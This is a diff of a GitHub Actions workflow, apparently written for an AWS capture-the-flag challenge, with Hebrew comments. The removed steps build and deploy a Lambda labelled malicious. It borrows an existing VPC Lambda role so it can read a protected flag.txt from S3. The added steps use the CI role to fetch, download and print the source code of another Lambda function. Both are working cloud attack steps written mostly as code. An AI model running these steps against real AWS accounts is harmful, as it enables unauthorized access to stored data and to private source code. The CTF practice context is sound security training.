@@ -17,36 +17,25 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Exploit via Lambda Creation
+      - name: Extract Lambda Source Code
         run: |
-          echo "=== Creating Malicious Lambda Payload ==="
-          cat << 'INNER_EOF' > exploit.py
-          import boto3
-          def lambda_handler(event, context):
-              s3 = boto3.client('s3')
-              try:
-                  # ניסיון לקרוא מהבאקט המאובטח
-                  flag = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode('utf-8')
-                  return {"flag": flag}
-              except Exception as e:
-                  return {"error": str(e)}
-          INNER_EOF
+          echo "=== Getting Function Configuration & Code Link ==="
+          aws lambda get-function --function-name nslookupv2 > function_info.json
           
-          zip -r exploit.zip exploit.py
+          echo "=== Extracting Download URL ==="
+          # שליפת ה-URL הזמני להורדת קוד המקור מתוך ה-JSON
+          DOWNLOAD_URL=$(jq -r '.Code.Location' function_info.json)
           
-          echo "=== Deploying Exploit Lambda ==="
-          # יצירת הפונקציה תוך שימוש ב-Role של ה-Lambda הקיימת שמוגדר בתוך ה-VPC
-          aws lambda create-function \
-            --function-name ctf-exploit-lambda \
-            --runtime python3.12 \
-            --role arn:aws:iam::009661764077:role/lambdaRole \
-            --handler exploit.lambda_handler \
-            --zip-file fileb://exploit.zip \
-            --vpc-config SubnetIds=subnet-0d86c3129f4405706,SecurityGroupIds=sg-0de9d1a2c42a08a3e || true
-            
-          echo "=== Invoking Exploit Lambda ==="
-          aws lambda invoke --function-name ctf-exploit-lambda --cli-binary-format raw-in-base64-out response.json || true
-          cat response.json || true
+          echo "=== Downloading Source Code ZIP ==="
+          curl -o lambda_source.zip "$DOWNLOAD_URL"
           
-          echo "=== Cleaning Up ==="
-          aws lambda delete-function --function-name ctf-exploit-lambda || true
+          echo "=== Unzipping Lambda Source ==="
+          mkdir lambda_extracted
+          unzip lambda_source.zip -d ./lambda_extracted/
+          
+          echo "=== Contents of Lambda Source ==="
+          ls -la ./lambda_extracted/
+          
+          echo "=== Reading extracted files ==="
+          cat ./lambda_extracted/lambda_function.py || true
+          cat ./lambda_extracted/* || true
